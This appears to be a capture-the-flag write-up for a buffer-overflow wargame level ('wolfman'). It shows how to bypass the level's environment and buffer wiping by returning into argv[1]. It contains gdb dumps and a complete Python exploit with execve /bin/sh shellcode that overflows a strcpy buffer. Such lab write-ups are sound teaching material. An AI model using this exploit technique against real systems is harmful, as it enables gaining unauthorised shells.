# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]); 
```

strcpy() copys argv[1] into buffer's address but doesn't check any boundary.

But in `wolfman.c`, Some protection is added. The code is:
```c
// egghunter 
for(i=0; environ[i]; i++)
  memset(environ[i], 0, strlen(environ[i]));

if(argv[1][47] != '\xbf')
{
  printf("stack is still your friend.\n");
  exit(0);
}

// buffer hunter
memset(buffer, 0, 40);
```
First, It resets all environment variables.

Second, I must use stack address in RET address.

Third, The program resets buffer's address.

So, I will use argv[1] address instead buffer's address because this program doesn't reset that address.
```
--------------------------------------------------------------
| NOP(15) | SHELLCODE(25) | AAAA(4) | RET[arg1's address](4) |
--------------------------------------------------------------
```
Run python script to get core file(to know where is argv[1]) and the buffer is:
```
(gdb) x/32x $esp-48
0xbffffac0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffad0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffae0:	0x00000000	0x00000000	0x41414141	0xbfffffff
```
As you see, the buffer's address is set to zero.

```
0xbffffc30:	0x90909000	0x90909090	0x90909090	0x90909090
(gdb) 
0xbffffc40:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xbffffc50:	0x31e18953	0xcd0bb0d2	0x41414180	0xffffff41
```
But argv[1] was not set to zero. Use this address to return.

# Payload
```python
import os
from struct import *

payload = ""
payload = payload + "\x90" * 15
payload = payload + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload = payload + "AAAA" # SFP
payload = payload + "\x34\xfc\xff\xbf" # RET

os.execv('/home/orc/wolfman', ["", payload])
```
